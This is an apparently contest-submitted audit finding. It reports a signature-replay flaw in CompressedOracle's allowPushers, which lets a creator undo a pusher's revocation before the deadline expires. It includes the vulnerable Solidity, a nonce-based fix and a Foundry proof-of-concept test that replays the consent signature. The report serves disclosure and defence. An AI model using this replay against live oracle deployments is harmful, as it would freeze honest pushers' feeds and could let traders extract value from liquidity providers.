### Title
`allowPushers` consent signature carries no per-use nonce, so a creator can replay it to silently re-establish a delegation the pusher just revoked, permanently redirecting the pusher's price updates into the wrong namespace until the deadline expires — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` signs pusher consent over `(chainid, oracle, deadline, pusher, creator)`. The deadline prevents replay **after** it expires, but the same signature is accepted an unlimited number of times **before** it expires. After a pusher calls `revokePusher()`, the creator can immediately replay the original `allowPushers` calldata to re-establish the delegation. The pusher's revocation is therefore ineffective for the entire remaining lifetime of the deadline, and every subsequent push the pusher makes lands in the creator's namespace instead of their own, leaving the pusher's own feeds permanently stale for any pool that reads them.

---

### Finding Description

The signed consent message is:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The code's own NatSpec acknowledges the replay concern:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [2](#0-1) 

The comment claims the deadline closes this window. It does not. The deadline is a **validity expiry**, not a **single-use nonce**. There is no on-chain record that a particular `(pusher, creator, deadline)` tuple has already been consumed. The same bytes can be submitted to `allowPushers` an unlimited number of times before `block.timestamp > deadline`.

`revokePusher` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But the creator can call `allowPushers` again in the same block with the identical signature, writing `namespaceRemapping[pusher] = creator` again. The pusher's revocation is undone with zero cost.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher makes after the failed revocation still lands in the creator's namespace, not the pusher's own.

---

### Impact Explanation

**Corrupted namespace → stale pusher-owned feeds → bad-price execution in dependent pools.**

Concrete path:

1. Pusher P operates a price-feed namespace that pool Q reads via `feedIdOf(pusherP, slot, pos)`.
2. Creator A convinces P to sign a delegation consent with a far-future deadline (e.g. 1 year).
3. Creator A calls `allowPushers`; `namespaceRemapping[P] = A`. P's pushes now land in A's namespace.
4. P discovers the misdirection and calls `revokePusher()`.
5. Creator A immediately replays the original `allowPushers` calldata. Mapping is restored to A.
6. P cannot stop this loop without ceasing all pushes.
7. P's own namespace (`feedIdOf(P, slot, pos)`) receives no further updates. Its `timestampMs` freezes.
8. Pool Q calls `provider.getBidAskPrice()` → oracle returns the frozen timestamp → the provider's `maxTimeDrift` check either (a) reverts every swap (DoS on pool Q) or (b) if the provider is misconfigured, passes a stale price into the swap math, producing an incorrect bid/ask that lets a trader extract value from LPs.

Both outcomes — unusable swap flow and stale-price execution — are within the contest's allowed impact gate.

---

### Likelihood Explanation

- Delegation with multi-day or multi-week deadlines is the normal operational pattern (pushers sign once and rotate keys infrequently).
- The replay requires only that the creator saved the original calldata — trivially available from the transaction history.
- No privileged role is needed; the creator is a semi-trusted actor whose only constraint is holding the original signed bytes.
- The pusher has no on-chain escape hatch until the deadline timestamp passes.

---

### Recommendation

Replace the deadline-only scheme with a **per-pusher nonce** that is incremented on every successful `allowPushers` and invalidated on every `revokePusher`/`removePushers`:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusherNonce[pusher],   // ← add nonce
        pusher, msg.sender
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;          // ← consume nonce
namespaceRemapping[pusher] = msg.sender;

// In revokePusher / removePushers:
pusherNonce[pusher]++;          // ← invalidate any outstanding signed consent
namespaceRemapping[pusher] = address(0);
```

This ensures that once a pusher revokes, every previously signed consent is cryptographically invalidated regardless of its deadline.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// forge test --match-test test_allowPushers_replay_after_revoke -vvvv

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayAfterRevokeTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator;

    function setUp() public {
        creator = makeAddr("creator");
        pusher  = vm.addr(PUSHER_KEY);
        oracle  = new CompressedOracleV1(address(this), 60_000); // 60 s drift
    }

    function test_allowPushers_replay_after_revoke() public {
        uint256 deadline = block.timestamp + 365 days; // realistic long deadline

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "step 2: mapped");

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "step 3: revoked");

        // 4. Creator replays the SAME signature — no new consent needed.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // BUG: revocation was silently undone.
        assertEq(
            oracle.namespaceRemapping(pusher),
            creator,
            "BUG: pusher re-delegated without new consent"
        );
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
